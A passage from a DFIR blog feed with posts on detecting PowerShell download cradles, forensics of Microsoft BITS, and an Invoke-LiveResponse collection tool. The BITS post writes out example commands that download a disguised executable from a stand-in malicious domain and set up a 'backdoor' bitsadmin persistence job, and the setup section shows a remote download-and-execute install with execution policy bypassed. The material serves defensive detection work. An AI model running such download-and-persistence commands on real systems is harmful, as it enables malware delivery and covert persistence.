&lt;p&gt;Not all download cradles I looked at had specific registry IOCs that were worth monitoring. An exception is the existence of powershell_RASMANCS and powershell_RASAPI32 tracing keys that are evidence of Powershell network communication.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_registry.png&quot; alt=&quot;Monitor for activity to HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS and HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;other-artefacts&quot;&gt;Other Artefacts&lt;/h3&gt;
&lt;p&gt;I would expect all modern EDR vendors to provide event visibility of the above artefacts as standard. However, in real world situations, agent coverage may be incomplete or we may be getting into the fight late for event telemetry.&lt;/p&gt;

&lt;p&gt;With that in mind, a component for download cradle detection is traditional forensic capability. Evidence of execution, registry, event logs or volatile data analysis spotting similar artefacts to the event data above is the obvious starting point. In the example below I have highlighted a prefetch entry with reference to the handle to some of the DLLs listed above.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-04-02-DownloadCradle/Powershell_prefetch.png&quot; alt=&quot;Evidence of Execution - Powershell Webclient method&quot; /&gt;
Microsoft BITS also has some specific forensic artefacts I have previously covered in another post that I have included in my references below.&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h1&gt;
&lt;p&gt;Network and endpoint visibility should be priority of all blue teams. Although focusing on a small section of the attack lifecycle, this post has been an overview of some of the areas I found interesting when thinking about download cradle detection. Understanding offensive technique and forensic artefacts enables blue teams to write high quality detections near the top the pyramid of pain. Correlating this data towards your own visibility levels, blue teams can work towards improvement and optimising resources for both detection and response.&lt;/p&gt;

&lt;p&gt;Let me know if you have any questions. I have added my &lt;a href=&quot;https://github.com/mgreen27/mgreen27.github.io/tree/master/static/other/DownloadCradle&quot;&gt;testing results and script here&lt;/a&gt;. I would be interested to hear results testing these out on different vendors.&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
&lt;p&gt;1) Arno0x0x. &lt;a href=&quot;https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/&quot;&gt;Windows oneliners to download remote payload and execute arbitrary code&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2) Bohannon, Daniel. &lt;a href=&quot;https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf&quot;&gt;DOSfuscation whitepaper&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3) Bohannon, Daniel. &lt;a href=&quot;https://github.com/danielbohannon/Invoke-Obfuscation&quot;&gt;Invoke-Obfuscation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4) Bohannon, Daniel. &lt;a href=&quot;http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-cradlecrafter-overview&quot;&gt;The Invoke-CradleCrafter Overview&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5) Bohannon, Daniel. Holmes, Lee. &lt;a href=&quot;https://github.com/danielbohannon/Revoke-Obfuscation&quot;&gt;Revoke-Obfuscation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;6) HarmJ0y. &lt;a href=&quot;https://gist.github.com/HarmJ0y/bb48307ffa663256e239&quot;&gt;DownloadCradles.ps1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;7) Have You Secured? &lt;a href=&quot;https://haveyousecured.blogspot.com.au/2017/07/taking-closer-look-at-powershell.html&quot;&gt;Taking a Closer Look at PowerShell Download Cradles&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;8) Green, Matthew. &lt;a href=&quot;https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html&quot;&gt;Sharing my BITS&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 02 Apr 2018 00:00:00 +1000</pubDate>
        <link>https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</link>
        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html</guid>
        
        <category>DFIR</category>
        
        <category>Powershell</category>
        
        
        <category>posts</category>
        
      </item>
    
      <item>
        <title>Sharing my BITS</title>
        <description>&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/00title.png&quot; width=&quot;700&quot; /&gt;&lt;/div&gt;

&lt;h2 id=&quot;sharing-my-bits&quot;&gt;Sharing my BITS&lt;/h2&gt;
&lt;p&gt;I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on download cradles and an interest in the client side forensics. I’m going to give a brief background, talk about some nuances in collection types and provide some background information when I was thinking about detection.&lt;/p&gt;

&lt;h3 id=&quot;what-is-bits-and-why-do-we-care&quot;&gt;What is BITS and why do we care?&lt;/h3&gt;
&lt;p&gt;Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. Part of all modern Windows systems from 2000+, the most well known use for BITS is Windows updates and other Windows transfer tasks.&lt;/p&gt;

&lt;p&gt;BITS has many interesting features including firewall whitelisted and proxy capable file transfer. BITS can also be configured on a schedule, with prioritisation or throttled transfer over idle network bandwidth. Additional “evil friendly” features are the ability to execute a command line option post job (persistence use case) and transfer policy. A newer feature is peer caching where subnet peer machines can be used as a cache for file downloads.&lt;/p&gt;

&lt;p&gt;In short that means BITS fits the profile as a candidate for attackers “living off the land”. Managed via a COM based API, Powershell or a built in binary (bitsadmin.exe), BITS can be used easily throughout the attack lifecycle.&lt;/p&gt;

&lt;p&gt;For those interested in digging further, I have included some detailed links on capabilities and configuration in my references below.&lt;/p&gt;

&lt;h3 id=&quot;artefact-creation&quot;&gt;Artefact creation&lt;/h3&gt;
&lt;p&gt;Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Bits download initiated via Powershell&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Start-BitsTransfer&lt;/span&gt; -Source &lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/mimi.jpg&quot;&lt;/span&gt; -Destination &lt;span class=&quot;s2&quot;&gt;&quot;c:\Windows\vss\mimi.exe&quot;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Peristence via bitsadmin.exe&lt;/span&gt;
CMD&amp;gt; bitsadmin /create backdoor
CMD&amp;gt; bitsadmin /addfile backdoor &lt;span class=&quot;s2&quot;&gt;&quot;http://www.totallylegitinappnews.com/evil.exe&quot;&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;c:\windows\VSS\evil.exe&quot;&lt;/span&gt;
CMD&amp;gt; bitsadmin /SetNotifyCmdLine backdoor c:\Windows\VSS\evil.exe NULL
CMD&amp;gt; bitsadmin /resume backdoor&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.&lt;/p&gt;

&lt;h3 id=&quot;collection---network&quot;&gt;Collection - Network&lt;/h3&gt;
&lt;p&gt;Network is by far the easiest collection point via typical web traffic filtering on user agent string and whitelisted domains. Although I have found everything from Windows, to application, to news traffic, with most BITS traffic is fairly static over time. I have found interesting use cases baselining current activity then spotting deviations from normal focusing on content, http method, destination and URL.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/01pcap.png&quot; width=&quot;500&quot; /&gt;&lt;/div&gt;

&lt;p&gt;Limitations in some environments are the obvious here: encrypted traffic. This method will also miss BITS setup with notification command line and not reaching out of the network.&lt;/p&gt;

&lt;h3 id=&quot;collection---endpoint&quot;&gt;Collection - Endpoint&lt;/h3&gt;
&lt;p&gt;Endpoint is by far the most detailed collection point, but generally the most difficult to master. I have broken out the endpoint into various sections to provide insights. “Defending off the land”, my goals are to find a lightweight collection capability to pull into a scripted solution without pre installation or change of audit policy. Unfortunately, that means probably the most valuable detection points: event monitoring via EDR, Sysmon and EventID 4688 (Process Creation + CLI) events are out, however some of the artefacts can be collected via EDR tools.&lt;/p&gt;

&lt;h1 id=&quot;bits-job-configuration&quot;&gt;Bits job configuration&lt;/h1&gt;
&lt;p&gt;BITS can be configured and jobs reviewed using either Powershell command-lets or bitsadmin.exe. Limitations on this type of collection are: unless collected during the transfer, only scheduled jobs are available.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/02powershell.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;p&gt;In my testing, both methods provide similar granular information on job details, however Bitsadmin does provide additional context. In my example below you can see additional configuration of the notification command line feature, also bypassing Autoruns detection.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/03powershell.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h1 id=&quot;qmgr-database&quot;&gt;QMGR database&lt;/h1&gt;
&lt;p&gt;Queue Manager queues store job specification and state. Typically located at: C:\ProgramData\Microsoft\Network\Downloader. For pre-Windows 10 systems, QMGR is stored in files named qmgr0.dat or qmgr1.dat.&lt;/p&gt;

&lt;p&gt;Limitations are: Microsoft has migrated to ESE database format for Queue Manager in Windows 10 and beyond leaving with a solution that would only work on some current systems.&lt;/p&gt;

&lt;p&gt;These are the files parsed by the ANSSI tool - bits_parser. Initially I toyed with the idea of a light weight binary parser in Powershell, to replicate bits_paser in non carving mode and roll in seperate capability for Windows 10.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/04bitsparser.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;p&gt;Results worked but led me to the second limitation: visibility is focused on scheduled or recent jobs. Thats is great for the BITS persistence use case but single BITS tasks can rotate out of the Queue Manager quickly and may not be recoverable even with carving. Assuming available data, I also found carving in Powershell was too resource intensive for a light weight collection so the preferred method would be to collect and parse offline if carving is required.&lt;/p&gt;

&lt;p&gt;Windows Event logs
Focusing on default event logs, the best source for detection of malicious download is the Microsoft-Windows-Bits-Client/Operational log. These logs hold: state, source, user and some file information for each BITS transfer. This event log also appears to be similar across Windows 7 through 10 so fits the profile and a good endpoint collection source.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/05eventlogs.png&quot; width=&quot;400&quot; /&gt;&lt;/div&gt;

&lt;p&gt;Limitations include: sparse data, logs are spread over several EventIDs and potentially a lot of entries in a production environment making it difficult to spot evil hiding in the noise. This log will also not shed light on abuse of BITS for persistence unless there was a network transfer to a suspicious domain as part of the configured job.&lt;/p&gt;

&lt;p&gt;Writing a script to pull all EventID 59 events, highlighting some of the available information from the event: Time (converted to UTC), JobName and Source URL we can see the kind of noise to expect in a few hours activity.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/06bitsdetectall.png&quot; alt=&quot;Parsing eventlogs for detection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Following similar concepts to network based detection, I was able to build a whitelist for common domains from my network logs and whitelist out most of the noise potentially seen day to day.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-02-18-Sharing_My_BITS/07bitsdetect.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;p&gt;This method may be particularly helpful in environments that may have limitations on network encryption visibility. Some work is required to build out the whitelist with lots of outliers in a large network.&lt;/p&gt;

&lt;p&gt;My content is &lt;a href=&quot;https://github.com/mgreen27/Invoke-BitsParser&quot;&gt;available here&lt;/a&gt;. Some of the other features I have added are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Configuration of days back to search (default 14).&lt;/li&gt;
  &lt;li&gt;A switch (“-All”) to list all entries available in the logs to collect data to rejig whitelists from an endpoint view.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h3&gt;
&lt;p&gt;I couldn’t finish this post without talking a little about capabilities all organisations should aspire to. Gold standard should be a mix of network and endpoint based visibility, with the ability to cover all gaps from each single source.&lt;/p&gt;

&lt;p&gt;Critical for a modern blue team, some of my recommendations are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Network based visibility around encrypted web traffic with content inspection.&lt;/li&gt;
  &lt;li&gt;Process command line visibility on the endpoints to spot evil process chains and unusual command lines or obfuscation that is abnormal for the environment.&lt;/li&gt;
  &lt;li&gt;Process module load visibility to spot unexpected functionality loaded.&lt;/li&gt;
  &lt;li&gt;Process network activity to unexpected locations is also a good method to increase the scope of detection on the endpoint and provide additional context to network detections that may have visibility limitations.&lt;/li&gt;
  &lt;li&gt;Spotting disk or registry write events out of normal activity and having context of associated process. Why is svchost.exe writing evil.exe to c:\Windows\VSS?&lt;/li&gt;
  &lt;li&gt;Ability to execute adlib collections to answer questions of the environment.&lt;/li&gt;
  &lt;li&gt;Upgrading to Powershell version 5 for Powershell script block visibility.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope this post has provided some good food for thought and pointed anyone interested in the direction for further research and reference material. Feel free to reach out if you have any questions.&lt;/p&gt;

&lt;p&gt;I couldn’t finish this post without talking a little about capabilities all organisations should aspire to. Gold standard should be a mix of network and endpoint based visibility, with the ability to cover all gaps from each single source.&lt;/p&gt;

&lt;p&gt;Critical for a modern blue team, some of my recommendations are:&lt;/p&gt;

&lt;p&gt;Network based visibility around encrypted web traffic with content inspection.
Process command line visibility on the endpoints to spot evil process chains and unusual command lines or obfuscation that is abnormal for the environment.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;p&gt;1) ANSSI. &lt;a href=&quot;https://github.com/ANSSI-FR/bits_parser&quot;&gt;Bits_Parser&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2) Azouri, Dor. &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/Dor%20Azouri/DEFCON-25-Dor-Azouri-BITSInject-WP.pdf&quot;&gt;BITSInject&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3) Bohannon, Daniel. &lt;a href=&quot;https://github.com/danielbohannon/Invoke-CradleCrafter&quot;&gt;Invoke-CradleCrafter&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4) Geiger,Matthew. &lt;a href=&quot;https://www.dfrws.org/sites/default/files/session-files/pres-finding_your_naughty_bits.pdf&quot;&gt;Finding Your Naughty BITS&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5) Hexacorn. &lt;a href=&quot;http://www.hexacorn.com/blog/2017/07/12/beyond-good-ol-run-key-part-64/&quot;&gt;Beyond Good Old RUn Key part 64&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;6) Microsoft. &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753856(v=ws.11)&quot;&gt;Bitsadmin documentation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;7) Microsoft. &lt;a href=&quot;https://github.com/MicrosoftDocs/windows-powershell-docs/tree/master/docset/windows/bitstransfer&quot;&gt;Powershell Bitstransfer documentation&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;8) Microsoft. &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ee663885(v=vs.85).aspx&quot;&gt;Using Windows Powershell to create BITS Jobs&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;9) O’Day, Dan. &lt;a href=&quot;https://github.com/danzek/annotationis/blob/master/Operating%20Systems/Windows/BITS.md&quot;&gt;BITS annotationis&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;10) Secureworks, Counter Threat Unit. &lt;a href=&quot;https://www.secureworks.com/blog/malware-lingers-with-bits&quot;&gt;Malware Lingers with BITS&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 18 Feb 2018 00:00:00 +1100</pubDate>
        <link>https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html</link>
        <guid isPermaLink="true">https://mgreen27.github.io/posts/2018/02/18/Sharing_my_BITS.html</guid>
        
        <category>DFIR</category>
        
        <category>BTIS</category>
        
        <category>Powershell</category>
        
        <category>LiveResponse</category>
        
        <category>IR</category>
        
        
        <category>posts</category>
        
      </item>
    
      <item>
        <title>Invoke-LiveResponse</title>
        <description>&lt;p&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/00PowerShellthumb.png&quot; alt=&quot; &quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;invoke-liveresponse&quot;&gt;Invoke-LiveResponse&lt;/h2&gt;
&lt;p&gt;In this post, I am going to talk about a Powershell module I have authored as a simple 
implementation for live response and file collections over Powershell remoting. The initial use case was considered after an endpoint vendor appliance failed and capability for raw collections was limited. The module uses Powerforensics over WinRM, and after some interest, I think is worth sharing.&lt;/p&gt;

&lt;p&gt;Some of the areas I will cover are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Background.&lt;/li&gt;
  &lt;li&gt;Requirements and setup.&lt;/li&gt;
  &lt;li&gt;Module switches and configuration.&lt;/li&gt;
  &lt;li&gt;Performance tweaks.&lt;/li&gt;
  &lt;li&gt;Forensic Footprint over WinRM.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The goal of this project was to promote Powershell as a blue team tool and improve my Powershell knowledge with research.&lt;/p&gt;

&lt;p&gt;Github: &lt;a href=&quot;https://github.com/mgreen27/Powershell-IR&quot;&gt;https://github.com/mgreen27/Powershell-IR&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;background&quot;&gt;Background&lt;/h3&gt;
&lt;p&gt;The ability to collect live response data from a remote system is a fundamental requirement for modern incident response. Rouge processes, code injection, suspicious network activity or other disk and memory artefacts are some of data points an analyst may look for signs of evil. The ability to collect these data points quickly, enables informed decisions and reduces risk of loss from an incident. Some of the difficulties in accessing these artefacts include lack of endpoint visibility or capabilities for ad-lib collection, from either a technical or business limitation.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/02powerforensics.png&quot; /&gt;&lt;/div&gt;

&lt;p&gt;PowerForensics is a disk forensic framework for Powershell written in C# by Jared Atkinson. Typical use case is local analysis from a traditional collection enabling the analyst to perform detailed disk forensics similar to the more well known Sleuth Kit. Powerforensics can also be used for similar tasks over Powershell remoting.&lt;/p&gt;

&lt;p&gt;In offensive security, one of the biggest enablers in Powershell is the capability to reflectively load PE files, shellcode and assembly into memory. That means security tools can be loaded from a Powershell script, in some cases never touching disk. The same techniques can be used by the Blue Team and quite a few practitioners are starting to use this feature for things like memory and volatile data forensics. Powerforensics enables the capability for remote raw disk analysis using Assembly.Load Method.&lt;/p&gt;

&lt;p&gt;Invoke-LiveResponse is the result of converting some scripts for raw collection with redirected acquisition and live response into an easy to use tool. During use, I have tweaked some performance and learnt a lot in implementation about both Powershell and Powerforensics.&lt;/p&gt;

&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Powershell 4.0 or above collector machine (3 should also be functional).&lt;/li&gt;
  &lt;li&gt;Powershell 2.0 or above target machine/s.&lt;/li&gt;
  &lt;li&gt;Powerforensics installed in running user Powershell Modules path (I have included automatic installation below).&lt;/li&gt;
  &lt;li&gt;WinRM setup with Kerberos and/or Negotiation authentication.&lt;/li&gt;
  &lt;li&gt;SMB Network share with write access (for file collections).&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;setup&quot;&gt;Setup&lt;/h3&gt;
&lt;p&gt;On a Powershell 4+ collector machine, assuming you trust me, run the following proxy aware powershell commands to download then install. The install places Invoke-LiveResponse into the running users profile.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Proxy aware download install of Invoke-LiveResponse&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;Set-Executionpolicy&lt;/span&gt; -ExecutionPolicy bypass -force
&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/mgreen27/Powershell-IR/master/Get-Forensicating.ps1&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;New-Object &lt;/span&gt;System.Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;.Proxy&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;System.Net.WebRequest]::GetSystemWebProxy&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;.Proxy.Credentials&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;System.Net.CredentialCache]::DefaultNetworkCredentials
&lt;span class=&quot;nb&quot;&gt;Invoke-Expression&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WebClient&lt;/span&gt;.DownloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Once installed run to load&lt;/span&gt;
Import-Module Invoke-LiveResponse

&lt;span class=&quot;c1&quot;&gt;# View help&lt;/span&gt;
Get-Help Invoke-LiveResponse -detailed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;winrm&quot;&gt;WinRM&lt;/h3&gt;
&lt;p&gt;I recommend setting WinRM up via Group policy for simplified deployment across all Powershell versions. Please see the resource section for some good resources and a detailed walkthrough, including a previous post of mine in setting up a lab.&lt;/p&gt;

&lt;p&gt;For a quick and dirty install, Invoke-StartWinRM will turn on PSRemoting and configure appropriate credential configurations on Powershell 3 machines and above. Similarly, Invoke-StopWinRM may also be used to revert changes.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/03invoke-startwinrm.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h3 id=&quot;credential-risk&quot;&gt;Credential Risk&lt;/h3&gt;
&lt;p&gt;To minimise credential risk, CredSSP (and any basic) authentication over WinRM should always be disabled. This results in a network logon type 3 and protected credentials of the account running WinRM. The drawbacks here means our SMB share for copy use cases requires unauthenticated write access or credentials passed into the script at runtime. As share credentials will be pushed to the endpoint, best practice would be to create temporary account/access to our share for the duration of our redirected file acquisition.&lt;/p&gt;

&lt;h3 id=&quot;memory&quot;&gt;Memory&lt;/h3&gt;
&lt;p&gt;Powershell has a configuration option to restrict the amount of memory available in a shell. This value is called MaxMemoryPerShellMB, and depending on Powershell version may be set in both Shell and Plugin WSMan configurations. In Powershell 2.0, the default is 150MB, which will likely need to be increased or turned off. As later versions of Powershell have been released, the default values have risen appropriately for most WinRM use, for example in 3.0 MaxMemoryPerShellMB = 1024, which is multiples above required memory.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# To view this setting locally&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;Get-Item &lt;/span&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB
&lt;span class=&quot;nb&quot;&gt;Get-Item &lt;/span&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB

&lt;span class=&quot;c1&quot;&gt;# To edit this setting locally&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;Set-Item &lt;/span&gt;WSMan:\localhost\Shell\MaxMemoryPerShellMB -Value 1024 -Force
&lt;span class=&quot;nb&quot;&gt;Set-Item &lt;/span&gt;WSMan:\localhost\Plugin\Microsoft.PowerShell\Quotas\MaxMemoryPerShellMB -Value 1024 -Force&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The simplest approach is to deploy WinRM via Group policy and configure these settings via GPO or logon script. For manual intervention, Invoke-MaxMemory will connect via WinRM and turn off this setting (set to 0). Powershell 2.0 has restrictions in remotely changing WinRM settings, although not ideal from a forensic standpoint, the “–Legacy” switch uses scheduled tasks to force a local configuration change.&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/05Maxmemory.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h2 id=&quot;invoke-liveresponse-1&quot;&gt;Invoke-LiveResponse&lt;/h2&gt;
&lt;p&gt;The current scope of Invoke-LiveResponse is a live response tool for targeted collection. There are two main modes of use in Invoke-LiveResponse and both are configured by a variety of command line switches.&lt;/p&gt;

&lt;h3 id=&quot;forensiccopy&quot;&gt;ForensicCopy&lt;/h3&gt;
&lt;p&gt;Configured by simple command line switches, Invoke-LiveResponse enables file collection from a remote machine over WinRM.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Reflectively loads Powerforensics onto target machine to enable raw disk access.&lt;/li&gt;
  &lt;li&gt;Leverages a scriptblock for each configured function of the script.&lt;/li&gt;
  &lt;li&gt;Common forensic artefacts and custom file collections.&lt;/li&gt;
  &lt;li&gt;Depending on the selected switches, each selected capability is joined at run time to build the scriptblock pushed out to the target machine.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nb&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Invoke-LiveResponse -ComputerName WinRMtester -Credential &amp;lt;Domain&amp;gt;\&amp;lt;user&amp;gt; 
-all -Map &amp;lt;Drive&amp;gt;: -UNC &lt;span class=&quot;s2&quot;&gt;&quot;\\&amp;lt;Server&amp;gt;\&amp;lt;folder&amp;gt; /user:&amp;lt;optional share credentials&amp;gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;
Some of the available configuration options:&lt;/p&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/07parameters1.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
Some of the switches available in ForensicCopy mode:&lt;/p&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/08parameters2.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h3 id=&quot;live-response&quot;&gt;Live Response&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Inspired by the Kansa Framework, LiveResponse mode will execute any Powershell scripts placed inside a content folder.&lt;/li&gt;
  &lt;li&gt;Results consist of the standard out from the executed content, redirected from the collection machine to a local Results folder as ScriptName.txt.&lt;/li&gt;
  &lt;li&gt;The benefit of this method is the ability to operationalise new capability easily by dropping in new content with desired StdOut.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# Command to run Powersell mode&lt;/span&gt;
Invoke-LiveResponse -ComputerName WinRMtester -Credential &amp;lt;domain&amp;gt;\&amp;lt;user&amp;gt; -LR  -Results &amp;lt;results&amp;gt; e.g C:\Cases&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/09LiveResponse.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;p&gt;Some of the additional switches available in LiveResponse and shell mode:&lt;/p&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;/static/img/article_images/2018-01-14-Invoke-LiveResponse/10parameters3.png&quot; width=&quot;600&quot; /&gt;&lt;/div&gt;

&lt;h3 id=&quot;performance-tweaks&quot;&gt;Performance Tweaks&lt;/h3&gt;
&lt;p&gt;Testing for Invoke-LiveResponse has primarily been on Windows 7 and 8.1, with some minor testing on Windows 10 and Server Operating systems. I have also tested on Powershell 2.0 to 5.0 target machines. The decision was made to use Powerforensics to enable raw collection and bypass the need to drop or run binaries as much as possible&lt;/p&gt;

